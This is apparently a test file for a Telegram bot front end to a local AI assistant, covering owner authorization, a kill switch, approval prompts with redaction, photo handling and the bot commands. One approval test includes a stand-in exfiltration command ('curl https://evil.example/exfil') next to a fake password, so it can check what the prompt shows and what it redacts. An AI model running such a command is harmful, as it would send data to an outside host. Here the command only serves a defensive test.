import { test, describe, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { TelegramBotClient, TelegramApiError } from '../src/telegram/bot.js';
import { COMMANDS, parseCommand } from '../src/telegram/commands.js';
import type { TelegramMessage, TelegramUpdate } from '../src/telegram/types.js';
import { KillSwitch } from '../src/security/kill-switch.js';
import { MAX_IMAGE_BYTES } from '../src/media/service.js';
import type { ModelBenchmarkScorecard } from '../src/eval/benchmark.js';
import {
  GIB,
  ScriptedProvider,
  fakeOllama,
  makeHarness,
  page,
  searchOk,
  type Harness,
  type HarnessOptions,
  type ProviderScript,
} from './fixtures/runtime-harness.js';

const OWNER_TG = 123456789;
const OWNER_TG_ID = String(OWNER_TG);
const STRANGER_TG = 999999999;
const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(64)]);

interface Sent {
  method: string;
  body: Record<string, any>;
}

async function settle(rounds = 30): Promise<void> {
  for (let i = 0; i < rounds; i++) await new Promise((resolve) => setImmediate(resolve));
}

async function waitFor(condition: () => boolean, rounds = 400): Promise<void> {
  for (let i = 0; i < rounds && !condition(); i++) await new Promise((resolve) => setImmediate(resolve));
  assert.ok(condition(), 'timed out waiting for the condition');
}

describe('TelegramBotClient', () => {
  let harness: Harness;
  let provider: ScriptedProvider;
  let bot: TelegramBotClient;
  let sent: Sent[] = [];
  let updateCounter = 100;

  interface SetupOptions {
    scripts?: ProviderScript[];
    harness?: HarnessOptions;
    ownerId?: string;
    allowOpenDev?: boolean;
    fetchImpl?: typeof fetch;
    getFile?: (fileId: string) => { file_id: string; file_size?: number; file_path?: string };
  }

  async function setup(options: SetupOptions = {}): Promise<void> {
    provider = new ScriptedProvider(options.scripts ?? [{ chunks: ['Jarvis test answer'] }]);
    harness = await makeHarness({ providerFactory: () => provider, ...options.harness });
    sent = [];
    bot = new TelegramBotClient({
      token: 'mock-test-token',
      ownerId: options.ownerId ?? OWNER_TG_ID,
      runtime: harness.rt,
      allowOpenDev: options.allowOpenDev ?? false,
      fetchImpl: options.fetchImpl,
    });
    // Mock API calls to prevent external network requests during unit tests
    bot.apiCall = async <T>(method: string, body?: Record<string, unknown>): Promise<T> => {
      sent.push({ method, body: body ?? {} });
      if (method === 'sendMessage' || method === 'editMessageText') {
        return {
          message_id: 100 + sent.length,
          chat: { id: (body?.chat_id as number) ?? OWNER_TG, type: 'private' },
          date: Math.floor(Date.now() / 1000),
          text: (body?.text as string) ?? '',
        } as T;
      }
      if (method === 'getFile') {
        const id = String(body?.file_id);
        return (options.getFile ? options.getFile(id) : { file_id: id, file_size: PNG.byteLength, file_path: 'photos/p.png' }) as T;
      }
      if (method === 'answerCallbackQuery' || method === 'sendChatAction') return true as T;
      return {} as T;
    };
    // The launcher registers the notifier after `getMe` succeeds; tests do it directly.
    bot.registerApprovalNotifier();
  }

  afterEach(async () => {
    bot?.stopPolling();
    await harness?.cleanup();
  });

  function message(text: string, from = OWNER_TG, extra: Partial<TelegramMessage> = {}): TelegramUpdate {
    return {
      update_id: updateCounter++,
      message: { message_id: updateCounter, from: { id: from, is_bot: false, first_name: 'Sender' }, chat: { id: from, type: 'private' }, date: 12345, text, ...extra },
    };
  }

  async function say(text: string, from = OWNER_TG): Promise<void> {
    await bot.handleUpdate(message(text, from));
  }

  const messages = (): Sent[] => sent.filter((call) => call.method === 'sendMessage');
  const texts = (): string[] => messages().map((call) => String(call.body.text));
  const lastText = (): string => texts().at(-1) ?? '';

  describe('transport', () => {
    beforeEach(() => setup());

    test('splits long messages cleanly into chunks <= 4000 chars', () => {
      const chunks = bot.splitMessage('A'.repeat(5000), 4000);
      assert.equal(chunks.length, 2);
      assert.equal(chunks[0].length, 4000);
      assert.equal(chunks[1].length, 1000);
    });

    test('a Markdown parse failure is retried as plain text, with the escapes removed, instead of being dropped', async () => {
      const bodies: Array<Record<string, unknown>> = [];
      bot.apiCall = async <T>(method: string, body?: Record<string, unknown>): Promise<T> => {
        bodies.push({ method, ...body });
        if (body?.parse_mode) throw new TelegramApiError(method, "Bad Request: can't parse entities", 400);
        return { message_id: 1, chat: { id: 1, type: 'private' }, date: 0 } as T;
      };
      await bot.sendMarkdown(1, 'snake\\_case and \\*literal');
      assert.equal(bodies.length, 2);
      assert.equal(bodies[0].parse_mode, 'Markdown');
      assert.equal(bodies[1].parse_mode, undefined);
      assert.equal(bodies[1].text, 'snake_case and *literal');
    });

    test('other send failures still throw', async () => {
      bot.apiCall = async () => {
        throw new TelegramApiError('sendMessage', 'Forbidden: bot was blocked by the user', 403);
      };
      await assert.rejects(() => bot.sendPlain(1, 'hello'), /bot was blocked/);
    });

    test('a 429 is retried once after the wait Telegram asks for', async () => {
      let calls = 0;
      bot.apiCall = async <T>(): Promise<T> => {
        calls += 1;
        if (calls === 1) throw new TelegramApiError('sendMessage', 'Too Many Requests', 429, 0);
        return { message_id: 1, chat: { id: 1, type: 'private' }, date: 0 } as T;
      };
      await bot.sendPlain(1, 'hello');
      assert.equal(calls, 2);
    });
  });

  describe('authorization fails closed', () => {
    test('with no owner configured nobody is served, but /id still tells anyone their id', async () => {
      await setup({ ownerId: '' });
      await say('Hello Jarvis', STRANGER_TG);
      assert.match(lastText(), /no owner configured/i);
      assert.equal(provider.calls.length, 0, 'no model call for an unconfigured bot');

      await say('/status', OWNER_TG);
      assert.match(lastText(), /no owner configured/i, 'even the would-be owner is refused until configured');

      await say('/id', STRANGER_TG);
      assert.match(lastText(), new RegExp(String(STRANGER_TG)));
      assert.match(lastText(), /TELEGRAM_OWNER_ID=999999999/);
    });

    test('the explicit development opt-in serves everyone, but no approval can be granted from Telegram', async () => {
      await setup({ ownerId: '', allowOpenDev: true });
      await say('Hello Jarvis', STRANGER_TG);
      assert.match(lastText(), /Jarvis test answer/);

      const decision = await harness.rt.approvals.request({ actionType: 'HOST_COMMAND', description: 'rm', tier: 2, requestedBy: 'test' });
      assert.equal(decision.approved, false);
      assert.match(decision.reason ?? '', /No approval channel/, 'the bot did not register itself, so nobody can be asked through it');
    });

    test('a stranger is refused, audited, and never reaches a model', async () => {
      await setup();
      await say('Hello Jarvis', STRANGER_TG);
      assert.match(lastText(), /Access Denied/);
      assert.equal(provider.calls.length, 0);
      const audit = await harness.rt.killSwitch.getRecentAuditLogs();
      assert.equal(audit[0].eventType, 'AUTH_FAILURE');
      assert.equal(audit[0].actor, `telegram:${STRANGER_TG}`);
      assert.ok(!JSON.stringify(audit[0].details).includes('Hello Jarvis'), 'the stranger\'s text is not copied into the audit log');
    });

    test('a stranger cannot use /resume, /kill or /status', async () => {
      await setup();
      await harness.rt.killSwitch.trigger('test', 'halt');
      await say('/resume', STRANGER_TG);
      assert.equal(harness.rt.killSwitch.isKilled(), true);
      await say('/kill', STRANGER_TG);
      await say('/status', STRANGER_TG);
      assert.ok(texts().every((text) => /Access Denied/.test(text)));
    });
  });

  describe('chat turns', () => {
    test('a message goes through the shared pipeline and gets ONE plain-text reply with the task tag and model', async () => {
      await setup({ scripts: [{ chunks: ['Hello *there*, snake_case', ' and more'] }] });
      await say('Say hello');

      const replies = messages().filter((call) => /Hello \*there\*/.test(String(call.body.text)));
      assert.equal(replies.length, 1);
      assert.equal(replies[0].body.parse_mode, undefined, 'model output is plain text');
      assert.match(String(replies[0].body.text), /^\[#\d+ Say hello\]/);
      assert.match(String(replies[0].body.text), /Hello \*there\*, snake_case and more/);
      assert.match(String(replies[0].body.text), /model: qwen3:8b/);

      const [session] = await harness.rt.sessions.listSessions(harness.rt.ownerUserId);
      const stored = await harness.rt.sessions.getMessages(harness.rt.ownerUserId, session.id);
      assert.deepEqual(stored.map((m) => m.role), ['user', 'assistant']);
    });

    test('the task completes (it does not sit queued) and /tasks reports the real status', async () => {
      await setup();
      await say('First question');
      await say('/tasks');
      assert.match(lastText(), /DONE/);
      assert.doesNotMatch(lastText(), /QUEUED/);
      const tasks = await harness.rt.sessions.listTasks({ userId: harness.rt.ownerUserId });
      assert.deepEqual(tasks.map((t) => t.status), ['done']);
    });

    test('a failed turn tells the owner why, saves no invented reply, and the task is failed', async () => {
      await setup({ scripts: [{ failImmediately: new Error('model crashed') }] });
      await say('Hello');
      assert.match(lastText(), /I could not answer: .*model crashed/);
      const [session] = await harness.rt.sessions.listSessions(harness.rt.ownerUserId);
      const stored = await harness.rt.sessions.getMessages(harness.rt.ownerUserId, session.id);
      assert.deepEqual(stored.map((m) => m.role), ['user']);
      const tasks = await harness.rt.sessions.listTasks({ userId: harness.rt.ownerUserId });
      assert.equal(tasks[0].status, 'failed');
      await say('/tasks');
      assert.match(lastText(), /FAILED/);
    });

    test('an unreachable model backend is reported with its reason', async () => {
      await setup({ harness: { fetchInventory: async () => fakeOllama([], { reachable: false, error: 'ECONNREFUSED' }) } });
      await say('Hello');
      assert.match(lastText(), /I could not answer/);
      assert.match(lastText(), /ollama|unreachable|ECONNREFUSED/i);
    });

    test('a throw anywhere in a turn still tells the owner', async () => {
      await setup();
      harness.rt.sessions.getOrCreateActiveSession = async () => {
        throw new Error('database is locked');
      };
      await say('Hello');
      assert.match(lastText(), /Something went wrong/);
      assert.match(lastText(), /database is locked/);
    });

    test('/research forces web research and appends the sources', async () => {
      await setup({
        harness: {
          search: { searchDetailed: async () => searchOk(['https://a.example/one']) },
          distiller: { fetchTopResults: async () => [page('https://a.example/one', 'The sky is blue because of Rayleigh scattering.')] },
        },
        scripts: [{ chunks: ['Rayleigh scattering.'] }],
      });
      await say('/research why is the sky blue');
      const reply = texts().find((text) => /Rayleigh scattering\./.test(text)) ?? '';
      assert.match(reply, /Sources:\n- https:\/\/a\.example\/one/);
    });

    test('a turn queued behind a slow one waits, and is told so', async () => {
      let release: () => void = () => {};
      const gate = new Promise<void>((resolve) => {
        release = resolve;
      });
      await setup({ scripts: [{ chunks: ['first'], gate }, { chunks: ['second'] }] });
      const first = bot.handleUpdate(message('one'));
      await waitFor(() => provider.calls.length === 1);
      const second = bot.handleUpdate(message('two'));
      await settle();
      assert.ok(texts().some((text) => /^Queued/.test(text)));
      assert.equal(provider.calls.length, 1, 'the second turn does not start while the first runs');
      release();
      await Promise.all([first, second]);
      assert.equal(provider.calls.length, 2);
    });
  });

  describe('model choice is per user and honoured', () => {
    beforeEach(() =>
      setup({
        harness: {
          fetchInventory: async () =>
            fakeOllama(['qwen3:8b', 'qwen3:14b'], {
              loaded: [{ name: 'qwen3:8b', sizeBytes: 5 * GIB, sizeVramBytes: 5 * GIB, expiresAt: null }],
            }),
        },
        scripts: [{ chunks: ['ok'] }],
      })
    );

    test('/models lists the real installed models with sizes and which are loaded', async () => {
      await say('/models');
      const text = lastText();
      assert.match(text, /qwen3:8b/);
      assert.match(text, /qwen3:14b/);
      assert.match(text, /GiB/);
      assert.match(text, /qwen3:8b`? [^\n]*loaded/);
      assert.doesNotMatch(text, /qwen2\.5/);
    });

    test('/model pins a model that is used on every turn until /model auto', async () => {
      await say('/model qwen3:14b');
      assert.match(lastText(), /pinned/);
      await say('first');
      assert.match(lastText(), /model: qwen3:14b/);
      await say('second');
      assert.match(lastText(), /model: qwen3:14b/);
      await say('/model auto');
      await say('third');
      assert.match(lastText(), /model: qwen3:8b/);
    });

    test('/model refuses a model that is not installed and leaves the choice unchanged', async () => {
      await say('/model qwen3:14b');
      await say('/model not-a-model:1b');
      assert.match(lastText(), /not installed/);
      assert.match(lastText(), /qwen3:8b, qwen3:14b/);
      await say('/model');
      assert.match(lastText(), /qwen3:14b/);
    });

    test('the choice survives a bot restart', async () => {
      await say('/model qwen3:14b');
      const second = new TelegramBotClient({ token: 'mock-test-token', ownerId: OWNER_TG_ID, runtime: harness.rt });
      second.apiCall = bot.apiCall;
      await second.handleUpdate(message('/model'));
      assert.match(lastText(), /qwen3:14b/);
    });

    test('the word "ensemble" in an ordinary message does not fan the prompt out to several models', async () => {
      await say('Compare the ensemble methods used in music and both models of car');
      assert.equal(provider.calls.length, 1);
      assert.doesNotMatch(texts().join('\n'), /Ensemble:/);
    });

    test('/ensemble on is per user and reports progress for each model it asks', async () => {
      await say('/ensemble on');
      assert.match(lastText(), /on/);
      await say('A question for the models');
      const progress = texts().filter((text) => /^Ensemble: asking/.test(text));
      assert.ok(progress.length >= 2, `expected per-model progress, got ${JSON.stringify(progress)}`);
      assert.ok(provider.calls.length >= 2);
      assert.match(lastText(), /Answered in turn by:/);

      const otherUser = 555;
      sent = [];
      await bot.handleUpdate(message('hello', otherUser));
      assert.match(lastText(), /Access Denied/, 'settings belong to the owner; strangers are still refused');
    });
  });

  describe('stopping and truncation', () => {
    test('a reply that hit the output limit is reported as cut off, not as complete', async () => {
      await setup({ scripts: [{ chunks: ['The three steps are: first open the'], doneReason: 'length', usage: { promptTokens: 10, completionTokens: 2048 } }] });
      await say('How do I do it?');
      assert.match(lastText(), /The three steps are: first open the/);
      assert.match(lastText(), /cut off at the output limit/);
    });

    test('the kill switch aborts the model call an ensemble answer is waiting on', async () => {
      await setup({
        harness: { fetchInventory: async () => fakeOllama(['qwen3:8b', 'qwen3:14b']) },
        scripts: [{ chunks: ['never'], gate: new Promise<void>(() => undefined) }],
      });
      await say('/ensemble on');
      const turn = say('A question for the models');
      await waitFor(() => provider.calls.length >= 1);
      const signal = provider.calls[0].options.signal;
      assert.equal(signal?.aborted, false);
      await harness.rt.killSwitch.trigger('test', 'halt');
      await turn;
      assert.equal(signal?.aborted, true);
      assert.match(lastText(), /Ensemble failed/);
    });
  });

  describe('kill switch', () => {
    test('/kill halts, reports only what it counted, gates messages and commands, and /resume re-arms', async () => {
      await setup();
      await say('/kill');
      const killText = lastText();
      assert.match(killText, /Kill switch ENGAGED/);
      assert.match(killText, /\d+ active task/);
      assert.equal(harness.rt.killSwitch.isKilled(), true);

      await say('Hello after kill');
      assert.match(lastText(), /System halted/);
      assert.equal(provider.calls.length, 0);
      await say('/models');
      assert.match(lastText(), /System halted/);
      await say('/status');
      assert.match(lastText(), /ENGAGED/);
      await say('/id');
      assert.match(lastText(), new RegExp(OWNER_TG_ID));

      await say('/resume');
      assert.match(lastText(), /Kill switch reset/);
      assert.equal(harness.rt.killSwitch.isKilled(), false);
      await say('Hello again');
      assert.match(lastText(), /Jarvis test answer/);
    });

    test('the engaged state is persisted: a fresh KillSwitch on the same store starts engaged', async () => {
      await setup();
      await say('/kill');
      assert.equal(new KillSwitch(harness.store).isKilled(), true);
    });

    test('/resume says so when nothing is engaged', async () => {
      await setup();
      await say('/resume');
      assert.match(lastText(), /not engaged/);
    });

    test('a slow turn does not block /kill, and the killed turn reports that it was cancelled', async () => {
      let release: () => void = () => {};
      const gate = new Promise<void>((resolve) => {
        release = resolve;
      });
      await setup({ scripts: [{ chunks: ['late answer'], gate }] });
      const slow = bot.handleUpdate(message('a slow question'));
      await waitFor(() => provider.calls.length === 1);

      await say('/kill');
      assert.match(lastText(), /1 active task/);
      assert.match(lastText(), /1 in-flight turn/);
      await slow;
      assert.ok(texts().some((text) => /Cancelled/.test(text)), 'the owner is told the request was cancelled');
      assert.ok(texts().every((text) => !/late answer/.test(text)), 'nothing from the killed turn is presented as an answer');
      release();
    });

    test('a queued message that runs after /kill is refused instead of answered', async () => {
      let release: () => void = () => {};
      const gate = new Promise<void>((resolve) => {
        release = resolve;
      });
      await setup({ scripts: [{ chunks: ['one'], gate }, { chunks: ['two'] }] });
      const first = bot.handleUpdate(message('first'));
      await waitFor(() => provider.calls.length === 1);
      const second = bot.handleUpdate(message('second'));
      await settle();
      await say('/kill');
      release();
      await Promise.all([first, second]);
      assert.equal(provider.calls.length, 1, 'the queued turn never reached the model');
      assert.ok(texts().some((text) => /System halted/.test(text)));
    });
  });

  describe('approvals', () => {
    beforeEach(() => setup());

    function approvalButtons(): Array<{ text: string; callback_data: string }> {
      const request = messages().find((call) => /Approval required/.test(String(call.body.text)));
      assert.ok(request, 'an approval request message was sent');
      return request.body.reply_markup.inline_keyboard[0];
    }

    test('the broker notifier asks the owner with Approve and Deny buttons that carry the request id', async () => {
      const pending = harness.rt.approvals.request({ id: 'req-1', actionType: 'HOST_COMMAND', description: 'run `git status` in repo', tier: 2, requestedBy: 'tool:host_command', metadata: { command: 'git' } });
      await waitFor(() => messages().length > 0);
      const request = messages()[0];
      assert.equal(request.body.chat_id, OWNER_TG);
      assert.equal(request.body.parse_mode, undefined, 'the approval prompt is plain text');
      assert.match(String(request.body.text), /HOST_COMMAND/);
      assert.match(String(request.body.text), /git status/);
      const [approve, deny] = approvalButtons();
      assert.equal(approve.callback_data, 'ap:1:req-1');
      assert.equal(deny.callback_data, 'ap:0:req-1');
      harness.rt.approvals.resolve('req-1', false, 'test');
      await pending;
    });

    test('the prompt shows the whole description, redacts per line, and says what was not shown in full', async () => {
      const tail = 'curl https://evil.example/exfil';
      const description = ['Tool: host_command', 'command: "node"', `args: ["password: hunter2","${'x'.repeat(900)}","${tail}"]`, 'body: "hello" (+1500 chars not shown)'].join('\n');
      const pending = harness.rt.approvals.request({
        id: 'req-full',
        actionType: 'HOST_COMMAND',
        description,
        tier: 2,
        requestedBy: 'jarvis',
        metadata: { args: [{ name: 'command', value: '"node"', omittedChars: 0, securityRelevant: true }, { name: 'body', value: '"hello"', omittedChars: 1500, securityRelevant: false }] },
      });
      await waitFor(() => messages().length > 0);
      const all = messages().map((m) => String(m.body.text)).join('\n');
      assert.ok(all.includes(tail), 'the tail of the command is shown');
      assert.ok(!all.includes('hunter2'), 'the secret value is redacted');
      assert.match(all, /Not shown in full: body \(\+1500 characters\)/);
      const last = messages().at(-1) as Sent;
      assert.ok(last.body.reply_markup, 'the keyboard is on the last part');
      harness.rt.approvals.resolve('req-full', false, 'test');
      await pending;
    });

    test('an action whose security-relevant value is cut off is refused without asking', async () => {
      const decision = await harness.rt.approvals.request({
        id: 'req-hidden',
        actionType: 'EMAIL_SEND',
        description: 'Tool: email_send\nto: "a@b.c" (+9 chars not shown)',
        tier: 2,
        requestedBy: 'jarvis',
        metadata: { args: [{ name: 'to', value: '"a@b.c"', omittedChars: 9, securityRelevant: true }] },
      });
      assert.equal(decision.approved, false);
      assert.match(decision.reason ?? '', /cannot show 'to' in full/);
      assert.equal(messages().length, 0);
    });

    test('the owner tapping Approve resolves the request as approved and the message is edited', async () => {
      const pending = harness.rt.approvals.request({ id: 'req-2', actionType: 'EMAIL_SEND', description: 'send', tier: 2, requestedBy: 'x' });
      await waitFor(() => messages().length > 0);
      await bot.handleUpdate({ update_id: 1, callback_query: { id: 'cb1', from: { id: OWNER_TG, is_bot: false, first_name: 'O' }, data: 'ap:1:req-2', message: { message_id: 101, chat: { id: OWNER_TG, type: 'private' }, date: 0 } } });
      const decision = await pending;
      assert.equal(decision.approved, true);
      assert.equal(decision.decidedBy, `telegram:${OWNER_TG}`);
      const edit = sent.find((call) => call.method === 'editMessageText');
      assert.match(String(edit?.body.text), /APPROVED by you/);
      assert.deepEqual(edit?.body.reply_markup, { inline_keyboard: [] });
    });

    test('the owner tapping Deny resolves the request as denied', async () => {
      const pending = harness.rt.approvals.request({ id: 'req-3', actionType: 'HOST_COMMAND', description: 'x', tier: 2, requestedBy: 'x' });
      await waitFor(() => messages().length > 0);
      await bot.handleUpdate({ update_id: 2, callback_query: { id: 'cb2', from: { id: OWNER_TG, is_bot: false, first_name: 'O' }, data: 'ap:0:req-3' } });
      assert.equal((await pending).approved, false);
      assert.match(String(sent.find((call) => call.method === 'answerCallbackQuery')?.body.text), /Denied/);
    });

    test('a stranger tapping Approve is refused and audited, and the request stays pending', async () => {
      const pending = harness.rt.approvals.request({ id: 'req-4', actionType: 'HOST_COMMAND', description: 'x', tier: 2, requestedBy: 'x' });
      await waitFor(() => messages().length > 0);
      await bot.handleUpdate({ update_id: 3, callback_query: { id: 'cb3', from: { id: STRANGER_TG, is_bot: false, first_name: 'S' }, data: 'ap:1:req-4' } });
      assert.match(String(sent.find((call) => call.method === 'answerCallbackQuery')?.body.text), /Unauthorized/);
      assert.equal(harness.rt.approvals.pending().length, 1, 'still waiting for the owner');
      const audit = await harness.rt.killSwitch.getRecentAuditLogs();
      assert.equal(audit.some((entry) => entry.eventType === 'AUTH_FAILURE' && entry.actor === `telegram:${STRANGER_TG}`), true);
      harness.rt.approvals.resolve('req-4', false, 'test');
      await pending;
    });

    test('an expired or unknown request id gets an honest reply and nothing runs', async () => {
      await bot.handleUpdate({ update_id: 4, callback_query: { id: 'cb4', from: { id: OWNER_TG, is_bot: false, first_name: 'O' }, data: 'ap:1:gone', message: { message_id: 7, chat: { id: OWNER_TG, type: 'private' }, date: 0 } } });
      assert.match(String(sent.find((call) => call.method === 'answerCallbackQuery')?.body.text), /Expired or already resolved/);
      assert.match(String(sent.find((call) => call.method === 'editMessageText')?.body.text), /No longer pending/);
    });

    test('the kill switch denies a waiting approval', async () => {
      const pending = harness.rt.approvals.request({ id: 'req-5', actionType: 'HOST_COMMAND', description: 'x', tier: 2, requestedBy: 'x' });
      await waitFor(() => messages().length > 0);
      await say('/kill');
      const decision = await pending;
      assert.equal(decision.approved, false);
      assert.match(decision.reason ?? '', /Kill switch/);
    });
  });

  describe('photos', () => {
    function visionFetch(models: string[], description = 'A red cat on a sofa.'): { fetchImpl: typeof fetch; generated: number } {
      const state = { generated: 0 };
      const fetchImpl = (async (input: string | URL | Request) => {
        const url = String(input);
        if (url.endsWith('/api/tags')) return new Response(JSON.stringify({ models: models.map((name) => ({ name })) }), { status: 200 });
        if (url.endsWith('/api/generate')) {
          state.generated += 1;
          return new Response(JSON.stringify({ response: description }), { status: 200 });
        }
        throw new Error(`unexpected fetch ${url}`);
      }) as typeof fetch;
      return Object.assign(state, { fetchImpl });
    }

    function photoMessage(caption: string | undefined, fileSize: number | undefined): TelegramUpdate {
      return message('', OWNER_TG, { text: undefined, caption, photo: [{ file_id: 'small', width: 90, height: 90, file_size: 100 }, { file_id: 'big', width: 800, height: 600, file_size: fileSize }] });
    }

    function downloadFetch(bytes: Buffer): { fetchImpl: typeof fetch; urls: string[] } {
      const urls: string[] = [];
      const fetchImpl = (async (input: string | URL | Request) => {
        urls.push(String(input));
        return new Response(bytes, { status: 200 });
      }) as typeof fetch;
      return { fetchImpl, urls };
    }

    test('with a vision model, the photo is described and the description reaches the model as fenced untrusted data', async () => {
      const vision = visionFetch(['qwen3:8b', 'llava:13b']);
      const download = downloadFetch(PNG);
      await setup({ fetchImpl: download.fetchImpl, harness: { mediaOptions: { fetchImpl: vision.fetchImpl, baseUrl: 'http://fake-ollama.local' } }, scripts: [{ chunks: ['It is a cat.'] }] });
      await bot.handleUpdate(photoMessage('What is this?', PNG.byteLength));

      assert.equal(vision.generated, 1);
      assert.ok(download.urls[0].includes('/file/botmock-test-token/photos/p.png'));
      assert.ok(sent.some((call) => call.method === 'getFile' && call.body.file_id === 'big'), 'the largest size is fetched');
      assert.match(provider.calls[0].prompt, /A red cat on a sofa\./);
      assert.match(provider.calls[0].prompt, /untrusted/i);
      assert.match(lastText(), /It is a cat\./);
    });

    test('/kill aborts the vision request of a photo that is being described', async () => {
      const seen = { generating: false, aborted: false };
      const fetchImpl = (async (input: string | URL | Request, init?: RequestInit) => {
  const url = String(input);
  if (url.endsWith('/api/tags')) return new Response(JSON.stringify({ models: [{ name: 'llava:13b' }] }), { status: 200 });
  return new Promise<Response>((_resolve, reject) => {
    seen.generating = true;
    init?.signal?.addEventListener('abort', () => {
      seen.aborted = true;
      reject(new Error('aborted'));
    });
  });
}) as typeof fetch;
      await setup({ fetchImpl: downloadFetch(PNG).fetchImpl, harness: { mediaOptions: { fetchImpl, baseUrl: 'http://fake-ollama.local' } } });
      const handling = bot.handleUpdate(photoMessage('What is this?', PNG.byteLength));
      while (!seen.generating) await new Promise((resolve) => setTimeout(resolve, 5));
      await harness.rt.killSwitch.trigger('test', 'halt');
      await handling;
      assert.equal(seen.aborted, true);
      assert.equal(provider.calls.length, 0);
    });

    test('without a vision model the owner is told the typed reason and nothing is invented', async () => {
      const vision = visionFetch(['qwen3:8b']);
      await setup({ fetchImpl: downloadFetch(PNG).fetchImpl, harness: { mediaOptions: { fetchImpl: vision.fetchImpl, baseUrl: 'http://fake-ollama.local' } } });
      await bot.handleUpdate(photoMessage(undefined, PNG.byteLength));
      assert.match(lastText(), /could not look at the image: no vision model is installed/);
      assert.equal(provider.calls.length, 0, 'no caption and no description: nothing to ask the model');
    });

    test('with a caption and no vision model the question is still answered, and the missing description is said first', async () => {
      const vision = visionFetch(['qwen3:8b']);
      await setup({ fetchImpl: downloadFetch(PNG).fetchImpl, harness: { mediaOptions: { fetchImpl: vision.fetchImpl, baseUrl: 'http://fake-ollama.local' } }, scripts: [{ chunks: ['I cannot see the image.'] }] });
      await bot.handleUpdate(photoMessage('What is this?', PNG.byteLength));
      assert.ok(texts().some((text) => /no vision model is installed/.test(text)));
      assert.equal(provider.calls.length, 1);
      assert.doesNotMatch(provider.calls[0].prompt, /red cat/);
    });

    test('an oversized photo is refused before anything is downloaded', async () => {
      const download = downloadFetch(PNG);
      await setup({ fetchImpl: download.fetchImpl });
      const update = message('', OWNER_TG, { text: undefined, photo: [{ file_id: 'huge', width: 5000, height: 5000, file_size: MAX_IMAGE_BYTES + 1 }] });
      await bot.handleUpdate(update);
      assert.match(lastText(), /over the 10 MB limit/);
      assert.equal(download.urls.length, 0);
      assert.equal(sent.some((call) => call.method === 'getFile'), false);
    });

    test('a size only revealed by getFile is also checked before the download', async () => {
      const download = downloadFetch(PNG);
      await setup({ fetchImpl: download.fetchImpl, getFile: (fileId) => ({ file_id: fileId, file_size: MAX_IMAGE_BYTES + 5, file_path: 'photos/x.png' }) });
      await bot.handleUpdate(photoMessage(undefined, undefined));
      assert.match(lastText(), /over the \d+-byte limit/);
      assert.equal(download.urls.length, 0);
    });

    test('a non-image document is declined', async () => {
      await setup();
      await bot.handleUpdate(message('', OWNER_TG, { text: undefined, document: { file_id: 'd', mime_type: 'application/pdf', file_size: 10 } }));
      assert.match(lastText(), /only look at images/);
    });
  });

  describe('commands', () => {
    beforeEach(() => setup());

    test('/status reports real numbers and no fake headroom verdict', async () => {
      await say('/status');
      const text = lastText();
      assert.match(text, /Jarvis status/);
      assert.match(text, /Host RAM/);
      assert.match(text, /VRAM free/);
      assert.match(text, /Ollama: ok/);
      assert.match(text, /Kill switch: armed/);
      assert.match(text, /Pending approvals: 0/);
      assert.doesNotMatch(text, /Headroom/i);
    });

    test('/status says when Ollama is unreachable', async () => {
      await harness.cleanup();
      await setup({ harness: { fetchInventory: async () => fakeOllama([], { reachable: false, error: 'ECONNREFUSED' }) } });
      await say('/status');
      assert.match(lastText(), /ollama unreachable/i);
    });

    test('/help lists exactly the commands that exist', async () => {
      await say('/help');
      const help = lastText();
      for (const spec of COMMANDS) assert.ok(help.includes(spec.usage), `/help is missing ${spec.usage}`);
      assert.doesNotMatch(help, /qwen2\.5/);
    });

    test('an unknown command is not sent to the model', async () => {
      await say('/frobnicate now');
      assert.match(lastText(), /Unknown command: \/frobnicate/);
      assert.equal(provider.calls.length, 0);
    });

    test('/cost shows recorded usage per model', async () => {
      await harness.cleanup();
      await setup({ scripts: [{ chunks: ['ok'], usage: { promptTokens: 120, completionTokens: 30, totalDurationMs: 1000, tokensPerSec: 30 } }] });
      await say('Hello');
      await say('/cost');
      assert.match(lastText(), /qwen3:8b: 1 call\(s\), 120 prompt \+ 30 completion tokens/);
    });

    test('/cost shows decode speed from the backend counters next to the end-to-end figure', async () => {
      await harness.cleanup();
      await setup({
        scripts: [{ chunks: ['ok'], usage: { promptTokens: 120, completionTokens: 30, totalDurationMs: 6000, evalDurationMs: 500, loadDurationMs: 4000, promptEvalDurationMs: 100 } }],
      });
      await say('Hello');
      await say('/cost');
      assert.match(lastText(), /decode 60\.0 tokens\/s, end-to-end 5\.0 tokens\/s \(includes load and thinking\)/);
      assert.match(lastText(), /avg load 4000 ms/);
    });

    test('/cost says so when nothing is recorded', async () => {
      await say('/cost');
      assert.match(lastText(), /No model usage/);
    });

    test('/tools lists tools with their tiers', async () => {
      await say('/tools');
      assert.match(lastText(), /system_stats: Tier 1/);
      assert.match(lastText(), /email_send: Tier 2 \(needs your approval\)/);
    });

    test('/mcp reports when no MCP server is running', async () => {
      await say('/mcp');
      assert.match(lastText(), /MCP servers running: none/);
    });

    test('/skills is empty at first, and /skill generates, sandbox-tests, and requires an explicit promote', async () => {
      await say('/skills');
      assert.match(lastText(), /No skills exist yet/);

      const json = JSON.stringify({ name: 'doubler', description: 'Doubles a number.', code: 'function run(input) { return input * 2; }', sampleInputs: [2, 5] });
      provider.setModel('qwen3:8b');
      const generating = new ScriptedProvider([{ chunks: [json] }]);
      harness.rt.providerFor = () => generating;
      await say('/skill double a number');
      assert.match(lastText(), /Sandbox: PASSED/);
      assert.match(lastText(), /-> 4/);
      assert.match(lastText(), /-> 10/);
      const [skill] = await harness.rt.skills.listSkills();
      assert.equal(skill.status, 'sandboxed', 'tested but not active');
      assert.match(lastText(), new RegExp(`/skill promote ${skill.id}`));

      await say(`/skill promote ${skill.id}`);
      assert.match(lastText(), /now active/);
    });

    test('/skill reports a model reply that is not a usable skill instead of inventing one', async () => {
      harness.rt.providerFor = () => new ScriptedProvider([{ chunks: ['Sure! Here you go.'] }]);
      await say('/skill do something');
      assert.match(lastText(), /did not return a usable skill/);
      assert.deepEqual(await harness.rt.skills.listSkills(), []);
    });

    test('/skill shows a failing sandbox honestly and the skill stays a draft', async () => {
      const json = JSON.stringify({ name: 'bad', description: 'Uses require.', code: "function run() { return require('fs'); }" });
      harness.rt.providerFor = () => new ScriptedProvider([{ chunks: [json] }]);
      await say('/skill read files');
      assert.match(lastText(), /Sandbox: FAILED/);
      const [skill] = await harness.rt.skills.listSkills();
      assert.equal(skill.status, 'draft');
